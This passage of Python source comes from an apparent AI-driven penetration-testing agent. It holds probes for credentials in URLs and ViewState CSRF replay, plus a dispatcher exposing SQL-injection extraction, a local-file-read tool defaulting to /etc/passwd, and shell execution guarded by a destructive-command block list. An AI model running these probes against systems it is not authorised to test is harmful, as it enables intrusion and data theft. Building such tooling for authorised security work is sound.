        safe_hash = hashlib.md5(safe_body.encode(errors="replace"), usedforsecurity=False).hexdigest()
        same_content = inj_hash == safe_hash

    # Honeytoken decision:
    #   - Injection marker shows up in BOTH injection AND safe response → mock
    #   - Or responses are byte-identical (server ignores the param) → mock
    if inj_marker_hits and safe_marker_hits:
        return {
            "honeytoken": True,
            "confidence": "high",
            "reason": (
                f"Vuln markers {inj_marker_hits} appear in response to BOTH "
                f"injection payload AND safe payload. Server is serving static "
                f"mock content — this is a honeytoken, not a real {vuln_class}."
            ),
            "inj_markers_found": inj_marker_hits,
            "safe_markers_found": safe_marker_hits,
            "action": "Mark finding as FALSE_POSITIVE / RETIRED.",
        }
    if same_content:
        return {
            "honeytoken": True,
            "confidence": "medium",
            "reason": (
                "Injection and safe payload produce byte-identical responses — "
                "server ignores the parameter entirely."
            ),
            "action": "Mark finding as FALSE_POSITIVE / RETIRED.",
        }
    if inj_marker_hits and not safe_marker_hits:
        return {
            "honeytoken": False,
            "confidence": "high",
            "reason": (
                f"Injection triggers markers {inj_marker_hits} but safe payload "
                f"does NOT — genuine {vuln_class} behavior."
            ),
            "inj_markers_found": inj_marker_hits,
            "action": "Finding is likely real. Proceed with confirmation.",
        }
    return {
        "honeytoken": "unknown",
        "confidence": "low",
        "reason": "No markers in either response — inconclusive. Try deeper probe.",
        "inj_body_len": len(inj_body),
        "safe_body_len": len(safe_body),
    }


async def _tool_detect_url_auth(
    login_url: str, test_username: str = "admin",
    test_password: str = "test1234",
) -> dict[str, Any]:
    """Check for auth-in-URL anti-pattern (credentials passed via query string).

    Fetches the login page, attempts a POST with test creds, inspects the
    response redirect + body for URL-based auth markers.
    """
    import aiohttp

    timeout = aiohttp.ClientTimeout(total=15)
    # Patterns that strongly indicate URL-based auth
    url_auth_params = re.compile(
        r"[?&](?:username|user|uname|userid|user_id|login|auth|token|"
        r"sessionid|session_id|sid|uid|email|password|pass|pwd|apikey|"
        r"api_key|access_token|jwt)=",
        re.IGNORECASE,
    )

    findings: list[dict[str, Any]] = []
    try:
        async with aiohttp.ClientSession(
            headers={**_get_auth_headers(), "User-Agent": _UA if "_UA" in globals() else "BugHound"},
        ) as s:
            # Fetch login page
            async with s.get(login_url, timeout=timeout, ssl=False) as r:
                login_body = await r.text(errors="replace")
                login_final_url = str(r.url)

            # Check login page itself
            for m in url_auth_params.finditer(login_final_url):
                findings.append({
                    "source": "login_page_url",
                    "url": login_final_url,
                    "matched_pattern": m.group(0),
                })

            # Scan login page links / forms for auth-in-URL hrefs
            # Forms with GET method submitting auth params are the classic case
            for form_match in re.finditer(
                r"<form[^>]*method\s*=\s*[\"']?get[\"']?[^>]*>(.*?)</form>",
                login_body, re.IGNORECASE | re.DOTALL,
            ):
                form_html = form_match.group(0)[:500]
                inputs = re.findall(
                    r'name\s*=\s*["\']([^"\']+)["\']', form_html, re.IGNORECASE,
                )
                auth_names = [
                    n for n in inputs if n.lower() in (
                        "username", "user", "login", "email", "password",
                        "pass", "pwd", "userid",
                    )
                ]
                if auth_names:
                    findings.append({
                        "source": "form_method_get",
                        "url": login_final_url,
                        "auth_field_names": auth_names,
                        "note": (
                            "Login form uses GET method — credentials will be "
                            "sent in URL query string (browser history + "
                            "referrer + logs exposure)."
                        ),
                    })

            # Attempt a test POST to see if response redirects with auth in URL
            form_data = aiohttp.FormData()
            # Guess common field names
            for k, v in [
                ("username", test_username), ("user", test_username),
                ("email", test_username), ("txtUserName", test_username),
                ("password", test_password), ("pass", test_password),
                ("txtPassword", test_password),
            ]:
                form_data.add_field(k, v)

            try:
                async with s.post(
                    login_url, data=form_data, timeout=timeout,
                    ssl=False, allow_redirects=False,
                ) as r:
                    loc = r.headers.get("Location", "")
                    if loc and url_auth_params.search(loc):
                        findings.append({
                            "source": "post_redirect",
                            "redirect_location": loc,
                            "note": (
                                "Login POST redirects to URL containing auth "
                                "params — session state carried in URL."
                            ),
                        })
            except Exception:
                pass
    except Exception as exc:
        return {"status": "error", "message": f"Probe failed: {exc}"}

    if findings:
        return {
            "url_auth_detected": True,
            "severity": "HIGH",
            "findings": findings,
            "impact": (
                "Credentials / auth tokens in URL leak via: browser history, "
                "HTTP Referrer headers to external sites, proxy/CDN logs, "
                "screen-share / over-shoulder. Any XSS on any page with a link "
                "out trivially steals the token via Referrer."
            ),
            "recommendation": "Use POST body + session cookies with HttpOnly.",
        }
    return {
        "url_auth_detected": False,
        "note": "No URL-based auth patterns detected on this endpoint.",
    }


async def _tool_test_viewstate_binding(target_url: str) -> dict[str, Any]:
    """Test if ASP.NET __VIEWSTATE is session-bound (CSRF-safe) or replayable.

    1. Session A: GET page, extract __VIEWSTATE + __EVENTVALIDATION.
    2. Session B (fresh cookie jar): POST to same page with Session A's
       ViewState.
    3. If POST succeeds (no "The state information is invalid" error),
       ViewState is not session-bound → CSRF replay possible.
    """
    import aiohttp

    timeout = aiohttp.ClientTimeout(total=15)

    def _extract_hidden(body: str, name: str) -> str:
        m = re.search(
            rf'<input[^>]*name="{re.escape(name)}"[^>]*value="([^"]*)"',
            body, re.IGNORECASE,
        )
        if m:
            return m.group(1)
        m = re.search(
            rf'<input[^>]*value="([^"]*)"[^>]*name="{re.escape(name)}"',
            body, re.IGNORECASE,
        )
        return m.group(1) if m else ""

    try:
        # Session A: capture ViewState
        async with aiohttp.ClientSession() as sa:
            async with sa.get(target_url, timeout=timeout, ssl=False) as r:
                a_body = await r.text(errors="replace")
                a_status = r.status
        viewstate = _extract_hidden(a_body, "__VIEWSTATE")
        event_validation = _extract_hidden(a_body, "__EVENTVALIDATION")
        viewstate_gen = _extract_hidden(a_body, "__VIEWSTATEGENERATOR")

        if not viewstate:
            return {
                "applicable": False,
                "reason": "No __VIEWSTATE field present — not an ASP.NET WebForms page.",
                "status_code": a_status,
            }

        # Session B: fresh cookie jar, replay
        async with aiohttp.ClientSession() as sb:
            post_data = {
                "__VIEWSTATE": viewstate,
                "__EVENTVALIDATION": event_validation,
                "__VIEWSTATEGENERATOR": viewstate_gen,
                # Harmless-looking submit
                "__EVENTTARGET": "",
                "__EVENTARGUMENT": "",
            }
            async with sb.post(
                target_url, data=post_data, timeout=timeout, ssl=False,
                allow_redirects=False,
            ) as r:
                b_body = await r.text(errors="replace")
                b_status = r.status

        invalid_markers = [
            "the state information is invalid",
            "validation of viewstate mac failed",
            "viewstate verification failed",
            "could not load viewstate",
        ]
        rejected = any(m in b_body.lower() for m in invalid_markers)

        if rejected:
            return {
                "applicable": True,
                "session_bound": True,
                "csrf_replay_possible": False,
                "note": "ViewState rejected across sessions — properly bound.",
                "status_codes": {"capture": a_status, "replay": b_status},
            }
        # Status 200/302 without invalid-state error = ViewState accepted
        if b_status < 500 and b_status != 400:
            return {
                "applicable": True,
                "session_bound": False,
                "csrf_replay_possible": True,
                "severity": "HIGH",
                "status_codes": {"capture": a_status, "replay": b_status},
                "note": (
                    "ViewState captured in one session accepted by server when "
                    "replayed from a DIFFERENT session. CSRF tokens are not "
                    "session-bound — attacker can harvest a ViewState + forge "
                    "POSTs from victim browser."
                ),
                "impact": (
                    "Any authenticated ASP.NET POST flow is CSRF-exploitable. "
                    "Attacker grabs ViewState from their own session, embeds "
                    "in victim-facing form, victim's browser submits with "
                    "their cookies."
                ),
                "recommendation": (
                    "Enable ViewStateUserKey in web.config + bind ViewState to "
                    "per-session nonce. Or use AntiForgeryToken pattern."
                ),
            }
        return {
            "applicable": True,
            "session_bound": "unknown",
            "csrf_replay_possible": "unknown",
            "note": f"Inconclusive — server returned {b_status}.",
            "status_codes": {"capture": a_status, "replay": b_status},
        }
    except Exception as exc:
        return {"status": "error", "message": f"Probe failed: {exc}"}


async def _tool_capture_workflow(
    start_url: str, actions: list[dict[str, Any]], wait_seconds: int = 2,
) -> dict[str, Any]:
    """Run a browser workflow with full traffic capture via Playwright.

    Records every request/response the browser makes during the actions,
    including hidden fields in form submissions (ViewState, CSRF tokens),
    cookies set, redirects followed. One atomic call covers the whole flow.
    """
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        return {
            "status": "error",
            "message": "Playwright not installed. pip install playwright && playwright install chromium",
        }

    captured_requests: list[dict[str, Any]] = []
    captured_responses: list[dict[str, Any]] = []
    console_logs: list[str] = []

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(
                ignore_https_errors=True,
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                ),
            )
            page = await context.new_page()

            # Record every request — includes POST body / form data
            async def _on_request(request: Any) -> None:
                try:
                    body = None
                    try:
                        body = request.post_data
                    except Exception:
                        body = None
                    captured_requests.append({
                        "req_id": id(request),
                        "method": request.method,
                        "url": request.url,
                        "headers": dict(request.headers),
                        "post_data": (body[:5000] if body else None),
                        "resource_type": request.resource_type,
                    })
                except Exception:
                    pass

            async def _on_response(response: Any) -> None:
                try:
                    headers = dict(response.headers)
                    captured_responses.append({
                        "req_id": id(response.request),
                        "url": response.url,
                        "status": response.status,
                        "headers": headers,
                        "set_cookie": headers.get("set-cookie", ""),
                    })
                except Exception:
                    pass

            page.on("request", lambda r: asyncio.ensure_future(_on_request(r)))
            page.on("response", lambda r: asyncio.ensure_future(_on_response(r)))
            page.on("console", lambda msg: console_logs.append(
                f"[{msg.type}] {msg.text}"[:150],
            ))

            action_log: list[dict[str, Any]] = []

            try:
                await page.goto(start_url, wait_until="domcontentloaded", timeout=15000)
                action_log.append({"action": "navigate", "url": start_url, "ok": True})
            except Exception as exc:
                action_log.append({
                    "action": "navigate", "url": start_url, "ok": False,
                    "error": str(exc)[:200],
                })

            # Execute each action
            for idx, act in enumerate(actions[:20]):  # cap at 20 actions
                atype = act.get("type", "").lower()
                try:
                    if atype == "navigate":
                        url = act.get("url", "")
                        await page.goto(url, wait_until="domcontentloaded", timeout=15000)
                        action_log.append({"action": "navigate", "url": url, "ok": True})
                    elif atype == "click":
                        sel = act.get("selector", "")
                        await page.click(sel, timeout=5000)
                        action_log.append({"action": "click", "selector": sel, "ok": True})
                    elif atype == "input":
                        sel = act.get("selector", "")
                        val = act.get("value", "")
                        await page.fill(sel, val, timeout=5000)
                        action_log.append({
                            "action": "input", "selector": sel,
                            "value_preview": val[:40], "ok": True,
                        })
                    elif atype == "submit_form":
                        sel = act.get("selector", "form")
                        await page.evaluate(
                            f"document.querySelector('{sel}').submit()",
                        )
                        action_log.append({"action": "submit_form", "selector": sel, "ok": True})
                    elif atype == "wait":
                        secs = int(act.get("seconds", 1))
                        await page.wait_for_timeout(secs * 1000)
                        action_log.append({"action": "wait", "seconds": secs})
                    elif atype == "evaluate":
                        js = act.get("js", "")
                        result = await page.evaluate(js)
                        action_log.append({
                            "action": "evaluate",
                            "result_preview": str(result)[:200],
                            "ok": True,
                        })
                    else:
                        action_log.append({
                            "action": atype, "ok": False,
                            "error": f"Unknown action type",
                        })
                except Exception as exc:
                    action_log.append({
                        "action": atype, "step": idx, "ok": False,
                        "error": str(exc)[:200],
                    })

            # Final settle
            await page.wait_for_timeout(wait_seconds * 1000)

            final_url = page.url
            final_title = ""
            final_body = ""
            try:
                final_title = await page.title()
                final_body = (await page.content())[:8000]
            except Exception:
                pass
            cookies = await context.cookies()
            cookie_list = [
                {
                    "name": c["name"],
                    "value": c["value"][:60],
                    "domain": c.get("domain", ""),
                    "httpOnly": c.get("httpOnly", False),
                    "secure": c.get("secure", False),
                }
                for c in cookies[:30]
            ]

            await browser.close()
    except Exception as exc:
        return {
            "status": "error",
            "message": f"Browser workflow failed: {str(exc)[:300]}",
            "captured_so_far": len(captured_requests),
        }

    # Merge requests + responses by req_id into flows
    resp_by_id = {r["req_id"]: r for r in captured_responses}
    flows: list[dict[str, Any]] = []
    for req in captured_requests:
        resp = resp_by_id.get(req["req_id"], {})
        flows.append({
            "method": req["method"],
            "url": req["url"],
            "req_headers": {
                k: v for k, v in req.get("headers", {}).items()
                if k.lower() in (
                    "content-type", "cookie", "referer", "origin",
                    "authorization", "x-requested-with",
                )
            },
            "post_data": req.get("post_data"),
            "resource_type": req.get("resource_type"),
            "status": resp.get("status"),
            "set_cookie": resp.get("set_cookie", ""),
        })

    # Filter out the noise (images, fonts, CSS) — keep doc/xhr/fetch/form
    significant = [
        f for f in flows
        if f.get("resource_type") in ("document", "xhr", "fetch", "other")
        or f.get("method") != "GET"
    ]

    return {
        "status": "success",
        "action_log": action_log,
        "final_url": final_url,
        "final_title": final_title,
        "final_body_preview": final_body,
        "cookies": cookie_list,
        "console_logs": console_logs[:30],
        "flows_total": len(flows),
        "flows_significant": len(significant),
        "flows": significant[:50],
    }


async def _tool_submit_form(
    url: str, field_overrides: dict[str, Any], form_index: int = 0,
    follow_redirects: bool = False,
) -> dict[str, Any]:
    """Parse a form, merge overrides with hidden fields, submit, return round-trip."""
    import aiohttp

    timeout = aiohttp.ClientTimeout(total=20)
    headers = {
        **_get_auth_headers(),
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }

    try:
        async with aiohttp.ClientSession(headers=headers, cookie_jar=aiohttp.CookieJar(unsafe=True)) as s:
            # Fetch the page containing the form
            async with s.get(url, timeout=timeout, ssl=False) as r:
                page_html = await r.text(errors="replace")
                page_url = str(r.url)
        # Find forms
        forms = list(re.finditer(
            r"<form\b[^>]*>(.*?)</form>",
            page_html, re.IGNORECASE | re.DOTALL,
        ))
        if not forms:
            return {"status": "error", "message": "No <form> found on page."}
        if form_index >= len(forms):
            form_index = 0
        form_match = forms[form_index]
        form_tag = form_match.group(0)

        # Extract action + method
        action_match = re.search(
            r'action\s*=\s*["\']([^"\']*)["\']', form_tag, re.IGNORECASE,
        )
        method_match = re.search(
            r'method\s*=\s*["\']?(get|post)["\']?', form_tag, re.IGNORECASE,
        )
        action = action_match.group(1) if action_match else page_url
        method = (method_match.group(1) if method_match else "POST").upper()

        # Resolve action URL
        from urllib.parse import urljoin
        action_url = urljoin(page_url, action)

        # Parse all input / textarea / select fields
        fields: dict[str, str] = {}
        for inp in re.finditer(
            r"<(?:input|textarea|select)\b[^>]*>", form_tag, re.IGNORECASE,
        ):
            tag = inp.group(0)
            nm = re.search(r'name\s*=\s*["\']([^"\']+)["\']', tag, re.IGNORECASE)
            val = re.search(r'value\s*=\s*["\']([^"\']*)["\']', tag, re.IGNORECASE)
            tp = re.search(r'type\s*=\s*["\']([^"\']+)["\']', tag, re.IGNORECASE)
            if not nm:
                continue
            name = nm.group(1)
            value = val.group(1) if val else ""
            input_type = (tp.group(1) if tp else "text").lower()
            # Skip submit buttons that weren't the one clicked; but keep named
            # submit buttons if they have a value (form expects them).
            if input_type in ("submit", "button", "image") and not value:
                continue
            fields[name] = value

        # Apply overrides
        for k, v in field_overrides.items():
            fields[k] = str(v)

        # Build and send
        async with aiohttp.ClientSession(
            headers=headers, cookie_jar=aiohttp.CookieJar(unsafe=True),
        ) as s:
            # Warm up session cookies first (fetch the form page again in same jar)
            async with s.get(url, timeout=timeout, ssl=False) as r:
                pass

            redirect_chain: list[dict[str, Any]] = []
            set_cookies_all: list[str] = []

            if method == "GET":
                from urllib.parse import urlencode
                qs = urlencode(fields)
                full_url = action_url + ("&" if "?" in action_url else "?") + qs
                # Manually handle redirects if follow_redirects
                current_url = full_url
                for hop in range(10 if follow_redirects else 1):
                    async with s.get(
                        current_url, timeout=timeout, ssl=False,
                        allow_redirects=False,
                    ) as resp:
                        sc = resp.headers.getall("Set-Cookie", [])
                        set_cookies_all.extend(sc)
                        loc = resp.headers.get("Location", "")
                        resp_status = resp.status
                        resp_body = (await resp.text(errors="replace"))[:6000]
                        resp_headers = {k: v for k, v in resp.headers.items()}
                    redirect_chain.append({
                        "url": current_url, "status": resp_status, "location": loc,
                    })
                    if not follow_redirects or resp_status not in (301, 302, 303, 307, 308) or not loc:
                        break
                    current_url = urljoin(current_url, loc)
                final_body = resp_body
                final_status = resp_status
                final_resp_headers = resp_headers
                req_payload = qs
                req_ct = "url-encoded (GET)"
            else:
                current_url = action_url
                for hop in range(10 if follow_redirects else 1):
                    if hop == 0:
                        async with s.post(
                            current_url, data=fields, timeout=timeout,
                            ssl=False, allow_redirects=False,
                        ) as resp:
                            sc = resp.headers.getall("Set-Cookie", [])
                            set_cookies_all.extend(sc)
                            loc = resp.headers.get("Location", "")
                            resp_status = resp.status
                            resp_body = (await resp.text(errors="replace"))[:6000]
                            resp_headers = {k: v for k, v in resp.headers.items()}
                    else:
                        async with s.get(
                            current_url, timeout=timeout, ssl=False,
                            allow_redirects=False,
                        ) as resp:
                            sc = resp.headers.getall("Set-Cookie", [])
                            set_cookies_all.extend(sc)
                            loc = resp.headers.get("Location", "")
                            resp_status = resp.status
                            resp_body = (await resp.text(errors="replace"))[:6000]
                            resp_headers = {k: v for k, v in resp.headers.items()}
                    redirect_chain.append({
                        "url": current_url, "status": resp_status, "location": loc,
                    })
                    if not follow_redirects or resp_status not in (301, 302, 303, 307, 308) or not loc:
                        break
                    current_url = urljoin(current_url, loc)
                final_body = resp_body
                final_status = resp_status
                final_resp_headers = resp_headers
                from urllib.parse import urlencode
                req_payload = urlencode(fields)
                req_ct = "application/x-www-form-urlencoded"

            # Detect session cookie established
            session_cookie_set = False
            sc_text = " ".join(set_cookies_all).lower()
            for marker in ("session", "auth", "sid", "token", "phpsessid", "aspxauth", "jsessionid"):
                if marker in sc_text:
                    session_cookie_set = True
                    break

            # Detect URL-auth pattern (username in Location)
            url_auth_in_redirect = False
            for hop in redirect_chain:
                if hop.get("location"):
                    if re.search(
                        r"[?&](?:username|user|uname|userid|email|token|auth|sid)=",
                        hop["location"], re.I,
                    ):
                        url_auth_in_redirect = True
                        break

            return {
                "status": "success",
                "request": {
                    "method": method,
                    "url": action_url,
                    "content_type": req_ct,
                    "payload": req_payload[:4000],
                    "fields_submitted": list(fields.keys()),
                    "hidden_field_count": len([
                        f for f in fields if f.startswith("__") or "token" in f.lower()
                    ]),
                },
                "response": {
                    "status": final_status,
                    "headers": {
                        k: v for k, v in final_resp_headers.items()
                        if k.lower() in (
                            "content-type", "location", "set-cookie",
                            "x-powered-by", "server",
                        )
                    },
                    "body_preview": final_body,
                    "redirect_chain": redirect_chain,
                    "set_cookies": set_cookies_all,
                    "session_cookie_set": session_cookie_set,
                    "url_auth_in_redirect": url_auth_in_redirect,
                },
            }
    except Exception as exc:
        return {"status": "error", "message": f"Form submit failed: {str(exc)[:300]}"}


async def _tool_record_user_story(
    workspace_id: str, story: dict[str, Any],
) -> dict[str, Any]:
    """Persist a UserStory record to agent/user_stories.json."""
    from bughound.core import workspace

    existing = await workspace.read_data(workspace_id, "agent/user_stories.json")
    items: list[dict[str, Any]]
    if isinstance(existing, dict) and "data" in existing:
        items = existing["data"] if isinstance(existing["data"], list) else []
    elif isinstance(existing, list):
        items = existing
    else:
        items = []

    # Dedup by candidate_id (last write wins)
    cid = story.get("candidate_id", "")
    items = [i for i in items if isinstance(i, dict) and i.get("candidate_id") != cid]
    items.append(story)

    await workspace.write_data(
        workspace_id, "agent/user_stories.json", items,
        generated_by="agent", target=cid or "unknown",
    )
    return {
        "status": "success",
        "candidate_id": cid,
        "total_stories": len(items),
        "path": "agent/user_stories.json",
    }


async def execute_tool(
    name: str,
    arguments: dict[str, Any],
    workspace_id: str,
    target_scope: str,
) -> str:
    """Execute a tool call and return the result as a JSON string.

    Parameters
    ----------
    name : str
        Tool function name from AGENT_TOOLS.
    arguments : dict
        Arguments from the AI's tool call.
    workspace_id : str
        Active workspace ID (injected if not in arguments).
    target_scope : str
        Target domain/URL for scope validation.

    Returns
    -------
    str
        JSON string result, truncated to _MAX_RESULT_LEN.
    """
    # Always use the real workspace_id (AI may hallucinate placeholders)
    ws_id = workspace_id

    try:
        if name == "get_attack_surface":
            result = await _tool_get_attack_surface(ws_id)

        elif name == "run_technique":
            result = await _tool_run_technique(
                ws_id, arguments["technique_id"],
            )

        elif name == "run_full_test":
            result = await _tool_run_full_test(
                ws_id, arguments.get("test_classes"),
            )

        elif name == "read_page":
            url = arguments.get("url", "")
            method = arguments.get("method", "GET")
            custom_headers = arguments.get("headers", {})

            if not _is_in_scope(url, target_scope):
                return json.dumps({"status": "error", "message": f"Out of scope: {url}"})

            try:
                headers = {"User-Agent": _USER_AGENT}
                headers.update(custom_headers)

                # Get auth headers if set
                try:
                    from bughound.tools.testing.injection_tester import _AUTH_HEADERS
                    headers.update(_AUTH_HEADERS)
                except Exception:
                    pass

                async with aiohttp.ClientSession() as session:
                    async with session.request(
                        method, url, headers=headers, ssl=False, timeout=_HTTP_TIMEOUT,
                    ) as resp:
                        body = await resp.text(errors="replace")
                        resp_headers = {k.lower(): v for k, v in resp.headers.items()}

                        # Extract useful info for the AI
                        import re

                        # Find forms
                        forms = re.findall(r'<form[^>]*>(.*?)</form>', body, re.S | re.I)
                        form_summary = []
                        for form_html in forms[:10]:
                            action = re.search(r'action=["\']([^"\']*)["\']', form_html, re.I)
                            method_attr = re.search(r'method=["\']([^"\']*)["\']', form_html, re.I)
                            inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\']', form_html, re.I)
                            form_summary.append({
                                "action": action.group(1) if action else "",
                                "method": method_attr.group(1) if method_attr else "GET",
                                "inputs": inputs,
                            })

                        # Find links
                        links = list(set(re.findall(r'href=["\']([^"\']*)["\']', body, re.I)))[:30]

                        # Find scripts src
                        scripts = list(set(re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', body, re.I)))[:10]

                        # Find HTML comments
                        comments = re.findall(r'<!--(.*?)-->', body, re.S)
                        comments = [c.strip()[:100] for c in comments if len(c.strip()) > 5][:10]

                        # Find hidden inputs
                        hidden = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']*)["\'][^>]*value=["\']([^"\']*)["\']', body, re.I)

                        # Find meta tags
                        meta = re.findall(r'<meta[^>]*name=["\']([^"\']*)["\'][^>]*content=["\']([^"\']*)["\']', body, re.I)

                        result = {
                            "status": "success",
                            "url": url,
                            "status_code": resp.status,
                            "content_type": resp_headers.get("content-type", ""),
                            "content_length": len(body),
                            "headers": dict(list(resp_headers.items())[:15]),
                            "title": (lambda m: m.group(1)[:100] if m else "")(re.search(r'<title>(.*?)</title>', body, re.I | re.S)),
                            "forms": form_summary,
                            "links": links,
                            "scripts": scripts,
                            "comments": comments,
                            "hidden_inputs": [{"name": n, "value": v[:50]} for n, v in hidden],
                            "meta": [{"name": n, "content": v[:50]} for n, v in meta[:10]],
                            "body_preview": body[:10000],
                        }

                        return json.dumps(result, default=str)[:_MAX_RESULT_LEN]

            except Exception as exc:
                return json.dumps({"status": "error", "message": str(exc)[:200]})

        elif name == "browse_page":
            url = arguments.get("url", "")
            if not _is_in_scope(url, target_scope):
                return json.dumps({"status": "error", "message": f"Out of scope: {url}"})

            wait_secs = arguments.get("wait_seconds", 3)
            inject_js = arguments.get("inject_js", "")

            try:
                from playwright.async_api import async_playwright

                async with async_playwright() as p:
                    browser = await p.chromium.launch(headless=True)
                    page = await browser.new_page()

                    # Capture console logs
                    console_logs: list[str] = []
                    page.on("console", lambda msg: console_logs.append(
                        f"[{msg.type}] {msg.text}"[:100]
                    ))

                    await page.goto(url, wait_until="networkidle", timeout=15000)
                    await page.wait_for_timeout(wait_secs * 1000)

                    # Get rendered HTML
                    rendered = await page.content()
                    title = await page.title()

                    # Execute optional JS
                    js_result = ""
                    if inject_js:
                        try:
                            js_result = str(await page.evaluate(inject_js))
                        except Exception as js_err:
                            js_result = f"JS error: {js_err}"

                    # Get cookies
                    cookies = await page.context.cookies()
                    cookie_list = [
                        {"name": c["name"], "value": c["value"][:50], "httpOnly": c.get("httpOnly")}
                        for c in cookies[:10]
                    ]

                    await browser.close()

                    import re
                    result = {
                        "status": "success",
                        "url": url,
                        "title": title,
                        "rendered_length": len(rendered),
                        "console_logs": console_logs[:20],
                        "cookies": cookie_list,
                        "js_result": js_result[:500] if js_result else "",
                        "body_preview": rendered[:10000],
                    }
                    return json.dumps(result, default=str)[:_MAX_RESULT_LEN]

            except ImportError:
                return json.dumps({"status": "error", "message": "Playwright not installed. Use read_page() instead."})
            except Exception as exc:
                return json.dumps({"status": "error", "message": f"Browser error: {str(exc)[:200]}"})

        elif name == "run_tool":
            command = arguments.get("command", "")
            cmd_timeout = arguments.get("timeout", 30)

            # Safety: block destructive commands
            _BLOCKED = ["rm ", "rm -", "rmdir", "mkfs", "dd ", "format ",
                        "drop ", "delete ", "truncate ", "shutdown",
                        "> /dev/", "curl.*-X DELETE", "wget.*-O /"]
            cmd_lower = command.lower()
            if any(b in cmd_lower for b in _BLOCKED):
                return json.dumps({"status": "error", "message": f"Blocked: destructive command"})

            # Scope check: any URL in command must be in scope
            import re as _re
            urls_in_cmd = _re.findall(r'https?://[^\s"\']+', command)
            for u in urls_in_cmd:
                if not _is_in_scope(u, target_scope):
                    return json.dumps({"status": "error", "message": f"Out of scope URL in command: {u}"})

            try:
                import subprocess
                proc = await asyncio.wait_for(
                    asyncio.create_subprocess_shell(
                        command,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                    ),
                    timeout=5,
                )
                stdout, stderr = await asyncio.wait_for(
                    proc.communicate(), timeout=cmd_timeout,
                )
                output = stdout.decode(errors="replace")[:5000]
                err = stderr.decode(errors="replace")[:1000]
                result = {
                    "status": "success",
                    "command": command,
                    "exit_code": proc.returncode,
                    "stdout": output,
                    "stderr": err if err else "",
                }
                return json.dumps(result)[:_MAX_RESULT_LEN]

            except asyncio.TimeoutError:
                return json.dumps({"status": "error", "message": f"Command timed out after {cmd_timeout}s"})
            except Exception as exc:
                return json.dumps({"status": "error", "message": str(exc)[:200]})

        elif name == "http_request":
            # Scope validation for HTTP requests
            url = arguments.get("url", "")
            if not _is_in_scope(url, target_scope):
                result = {
                    "status": "error",
                    "message": (
                        f"URL '{url}' is out of scope. "
                        f"Target scope: {target_scope}"
                    ),
                }
            else:
                result = await _tool_http_request(
                    method=arguments.get("method", "GET"),
                    url=url,
                    headers=arguments.get("headers"),
                    body=arguments.get("body"),
                    body_type=arguments.get("body_type", "form"),
                )

        elif name == "extract_sqli_data":
            url = arguments.get("url", "")
            if not _is_in_scope(url, target_scope):
                result = {
                    "status": "error",
                    "message": f"URL '{url}' is out of scope.",
                }
            else:
                result = await _tool_extract_sqli_data(
                    url=url,
                    param=arguments.get("param", ""),
                    db_type=arguments.get("db_type", "mysql"),
                    query=arguments.get("query", ""),
                )

        elif name == "read_file_via_lfi":
            url = arguments.get("url", "")
            if not _is_in_scope(url, target_scope):
                result = {
                    "status": "error",
                    "message": f"URL '{url}' is out of scope.",
                }
            else:
                result = await _tool_read_file_via_lfi(
                    url=url,
                    param=arguments.get("param", ""),
                    file_path=arguments.get("file_path", "/etc/passwd"),
                )

        elif name == "get_findings":
            result = await _tool_get_findings(ws_id)

        elif name == "validate_findings":
            result = await _tool_validate_findings(ws_id)

        elif name == "generate_report":
            result = await _tool_generate_report(ws_id)

        elif name == "update_finding_status":
            fid = arguments.get("finding_id", "")
            status = arguments.get("status", "NEEDS_MANUAL_REVIEW")
            new_evidence = arguments.get("evidence", "")

            try:
                from bughound.core import workspace
                raw = await workspace.read_data(ws_id, "vulnerabilities/scan_results.json")
                findings = raw.get("data", raw) if isinstance(raw, dict) else (raw or [])

                if not isinstance(findings, list):
                    return json.dumps({"status": "error", "message": "No findings loaded"})

                # Find by finding_id (exact match first, then prefix match)
                matched_idx = None
                for i, f in enumerate(findings):
                    if isinstance(f, dict) and f.get("finding_id") == fid:
                        matched_idx = i
                        break

                if matched_idx is None and len(fid) >= 10:
                    # Prefix match — AI sometimes truncates the last 1-2 hex chars
                    for i, f in enumerate(findings):
                        if isinstance(f, dict) and f.get("finding_id", "").startswith(fid):
                            matched_idx = i
                            break

                if matched_idx is None:
                    # Fallback: try as 1-based integer index
                    try:
                        idx_int = int(fid) - 1
                        if 0 <= idx_int < len(findings):
                            matched_idx = idx_int
                    except (ValueError, TypeError):
                        pass

                if matched_idx is None:
                    return json.dumps({"status": "error", "message": f"Finding '{fid}' not found (total: {len(findings)})"})

                findings[matched_idx]["validation_status"] = status
                findings[matched_idx]["validated"] = True
                findings[matched_idx]["validation_tool"] = "ai_agent"
                if new_evidence:
                    findings[matched_idx]["evidence"] = new_evidence

                await workspace.write_data(
                    ws_id, "vulnerabilities/scan_results.json", findings,
                    generated_by="ai_agent", target="validation",
                )

                cls = findings[matched_idx].get("vulnerability_class", "?")
                ep = findings[matched_idx].get("endpoint", "?")[:50]
                return json.dumps({
                    "status": "success",
                    "message": f"Finding {fid} ({cls}) -> {status}",
                    "endpoint": ep,
                })
            except Exception as exc:
                return json.dumps({"status": "error", "message": str(exc)[:200]})

        elif name == "add_finding":
            result = await _tool_add_finding(
                workspace_id=ws_id,
                vulnerability_class=arguments["vulnerability_class"],
                severity=arguments["severity"],
                endpoint=arguments["endpoint"],
                description=arguments["description"],
                evidence=arguments["evidence"],
                curl_command=arguments.get("curl_command", ""),
                impact=arguments.get("impact", ""),
            )

        elif name == "verify_not_honeytoken":
            url = arguments["url"]
            if not _is_in_scope(url, target_scope):
                return json.dumps({"status": "error", "message": f"Out of scope: {url}"})
            result = await _tool_verify_not_honeytoken(
                url=url,
                param=arguments["param"],
                injection_value=arguments["injection_value"],
                safe_value=arguments["safe_value"],
                vuln_class=arguments["vuln_class"],
            )

        elif name == "detect_url_auth":
            url = arguments["login_url"]
            if not _is_in_scope(url, target_scope):
                return json.dumps({"status": "error", "message": f"Out of scope: {url}"})
            result = await _tool_detect_url_auth(
                login_url=url,
                test_username=arguments.get("test_username", "admin"),
                test_password=arguments.get("test_password", "test1234"),
            )

